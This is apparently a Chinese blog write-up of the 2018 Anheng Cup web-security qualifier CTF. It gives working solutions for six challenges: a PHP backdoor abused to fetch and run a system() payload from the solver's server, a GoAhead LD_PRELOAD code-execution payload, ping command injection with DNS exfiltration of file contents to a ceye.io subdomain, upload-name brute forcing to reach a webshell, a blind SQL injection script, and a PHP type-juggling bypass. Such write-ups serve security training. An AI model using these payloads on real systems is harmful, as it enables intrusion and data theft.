---
layout: post
summary: 2018安恒杯Web安全测试秋季资格赛
featured-img: moc
title: 2018WriteUp
---

## 2018安恒杯Web安全测试秋季资格赛

### 爱い窒息、痛 

进入题目，是一个大马后门，审计代码：

```php
<?php
    $a=isset($_POST['pass'])?trim($_POST['pass']):'';
    if($a==''){
        echologin();
    }else{
        chkpass($a);
        helloowner($a);
    }
    function chkpass($a){
        if(stripos($_SERVER['HTTP_USER_AGENT'],md5($a))===false){
            echofail(1);
        }
        return true;
    }
    function helloowner($a){
        $b=gencodeurl($a);
        $c=file_get_contents($b);
        if($c==false){
            echofail(2);
        }
        $d=@json_decode($c,1);
        if(!isset($d['f'])){
            echofail(3);
        }
        $d['f']($d['d']);
    }
    function gencodeurl($a){
        $e=md5(date("Y-m-d"));
        if(strlen($a)>40){
            $f=substr($a,30,5);
            $g=substr($a,10,10);
        }else{
            $f='good';
            $g='web.com';
        }
        $b='http://'.$f.$g;return $b;
    }
?>
```

传入一个字符串`pass`，其中有15位是我们可控的（ipv4最长情况3\*4+3，如果有短点的域名也可以，假如`ip`不足15位，则在后面补`/`，一样可以正常解析，如：`12.221.21.222//`）。

当`pass`的md5值与`User-Agent`相等时，服务器请求`pass`中的可控15字符，并将返回的`json`解析后执行`$d['f']($d['d'])`

故在服务器上部署代码，修改`apache`将`index：80`指向它，这样就可以直接以`ip`访问：

```php
<?php
$a = array("f" => "system", "d" => "/bin/cat ../flag.php");
echo json_encode($a);
?>
```

使用脚本访问：

```python
import requests

url = "http://114.55.36.69:8020/upload/dama.php"
_data = {
    "pass": "0000000000xxxxxxx///0000000000xxxxx000000",  # xxxx为服务器ip
    "submit": "submit"
}
_headers = {
    "User-Agent": "d35452fe56acbbbf06c1d4db1968f9ba"
}
r = requests.post(url, data=_data, headers=_headers)
print(r.text)
```

获得Flag

***

### GOGOGO

进去查看相应头`Server: GoAhead-http`，查找资料，这个`cgi`存在代码执行漏洞

网上的`POC`大多为反弹`shell`，这道题由于服务器配置问题无法实现，有题干知`flag`在`cgi-bin/hello.cgi`中，故只需要执行代码读取`cgi`文件即可

Linux中编写如下代码（我开始想复杂了，还想调用`popen`执行`cat`读取，只需要`fread`就可以了）：

```c
//poc.c
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>

static void before_main(void) __attribute__((constructor));
static void before_main(void){	
	FILE* fp = fopen("cgi-bin/hello.cgi", "r");
	char buf[2048];
	fread(buf, sizeof(buf), 1, fp);
	write(1, buf, sizeof(buf));
}
```

执行指令编译动态库并发送`payload`：

`gcc -shared -fPIC poc.c -o poc.so && curl -X POST --data-binary @poc.so http://114.55.36.69:8018/cgi-bin/hello.cgi?LD_PRELOAD=/proc/self/fd/0 -i --output 1.txt`

读取1.txt获得flag

***

###  ping也能把你ping挂 

进入题目执行`ping`指令：

`127.0.0.1&ls`

```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.039 ms
config.php
contain.html
css
img
index.php
js
ping.php
upload
you_find_upload.php
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.043 ms

--- 127.0.0.1 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 999ms
rtt min/avg/max/mdev = 0.039/0.041/0.043/0.002 ms
```

进入文件`you_find_upload.php`，可上传图片，此处有解析漏洞，上传`.php.jpg`后缀文件（原本以为是`.php;.jpg`解析漏洞，这里坑了好久），分析源码后暴力猜解随机数即可，使用别人的php`payload`：

```php
<?php
set_time_limit(0);
$url = 'http://114.55.36.69:6664/upload/';
$start = 1;
$end = 10000;
$index = $start;
$random_pre = '';
$filename = '';
$result = '##';
while($index <= $end){
    echo "No.".$index;
    echo "<br>";
    mt_srand($index);
    mt_rand();
    $random_pre = mt_rand();
    $filename = $random_pre.'_404.php.jpg';
    $cur_url = $url.$filename;
    if(curl_get($cur_url)){
        $result = $result.$filename.'--';
        exit;
    }
    $index++;
}
if($index == 1001){
    echo "no result!";
}
     
function curl_get($tmp_url){
    $ch=curl_init();
    curl_setopt($ch,CURLOPT_URL,$tmp_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch,CURLOPT_HEADER,1);
    $result=curl_exec($ch);
    $code=curl_getinfo($ch,CURLINFO_HTTP_CODE);
    if($code=='404' && $result){
        curl_close($ch);
        return 0;
    } else {
        curl_close($ch);
        echo $code;
        echo "<br>";
        echo "#####got one!===>>>".$tmp_url;
        echo "<br>";
        return 1;
    }
}
```

猜解成功后菜刀连接，得到flag

***

### ping

进入后查看`robots.txt`，获得源码，以及`where_is_flag.php`

```php
<?php 
include("where_is_flag.php");
echo "ping";
$ip =(string)$_GET['ping'];
$ip =str_replace(">","0.0",$ip);
system("ping  ".$ip);
?>
```

知需要使用`ping`读取文件`where_is_flag.php`，这里使用一个开源项目搭建的平台[CEYE](http://ceye.io/records/dns)，原理是访问一个域名的下属子域名时，`dns`解析会有记录。在linux中可以使用飘号包裹命令，如：`ping 'echo 111'.xxx.com`（`'`代表飘号，`Markdown`中写不出来）。或可以使用`ping http://xxxxx/'whoami'`，解析主机的访问记录

但是这里由于换行符的干扰无法直接读取文件，故使用`bash`的循环：

```
ping=127.0.0.1 -c 1;for i in `cat where_is_flag.php`;do ping $i.3awcx4.ceye.io;done;
```

得到`$flag="dgfsdunsadkjgdgdfhdfhfgdhsadf/flag.php"`，同样的方法读取，得到flag

***

### 进击的盲注

这题过滤了括号和斜杠，看了网上的思路知道使用`order by`注入，且需使用`binary`区分大小写

盲注脚本：

```python
import requests

url = "http://114.55.36.69:6663/index.php"
flag = ""
while True:
    for i in range(48, 127):
        _data = {
            'username': f"admin' union select 1, 2, binary '{flag+chr(i)}' order by 3#",
            "password": "aaa"
        }
        r = requests.post(url, data=_data)
        #print(_data["username"])
        if "password error!" in r.text:
            flag += chr(i-1)
            print(flag)
            break
```

output: 

```
λ python3 blind.py       
d                        
dV                       
dVA                      
dVAx                     
dVAxM                    
dVAxME                   
dVAxMEB                  
dVAxMEBk                 
dVAxMEBkX                
dVAxMEBkX2               
dVAxMEBkX25              
dVAxMEBkX25F             
dVAxMEBkX25Fd            
dVAxMEBkX25Fdy           
dVAxMEBkX25Fdy5          
dVAxMEBkX25Fdy5w         
dVAxMEBkX25Fdy5wa        
dVAxMEBkX25Fdy5waH       
dVAxMEBkX25Fdy5waHA      
dVAxMEBkX25Fdy5waHA=     
dVAxMEBkX25Fdy5waHA=/    
dVAxMEBkX25Fdy5waHA=//   
dVAxMEBkX25Fdy5waHA=///  
dVAxMEBkX25Fdy5waHA=//// 
dVAxMEBkX25Fdy5waHA=/////
```

解码得`uP10@d_nEw.php`，是一个文件上传，同上一道题，`.php.jpg`解析错误，传马后菜刀连接得flag



***

### 奇怪的恐龙特性 

我觉得不止恐龙奇怪，PHP和出题人都挺奇怪的。

```php
 <?php
highlight_file(__FILE__);
ini_set("display_error", false); 
error_reporting(0); 
$str = isset($_GET['A_A'])?$_GET['A_A']:'A_A';
if (strpos($_SERVER['QUERY_STRING'], "A_A") !==false) {
    echo 'A_A,have fun';
}
elseif ($str<9999999999) {
    echo 'A_A,too small';
}
elseif ((string)$str>0) {
    echo 'A_A,too big';
}
else{
    echo file_get_contents('flag.php');
    
}

 ?> 
```

代码审计，需要绕过

传入`A.A`，后台php会自动转为`A_A`。而且php里数组与其余对象比较总是很奇怪，payload为`A.A[]=1`，我觉得php和js这种莫名其妙的逻辑简直是魔鬼

出题人也很奇怪，flag出来了但注释掉了，需要查看源码
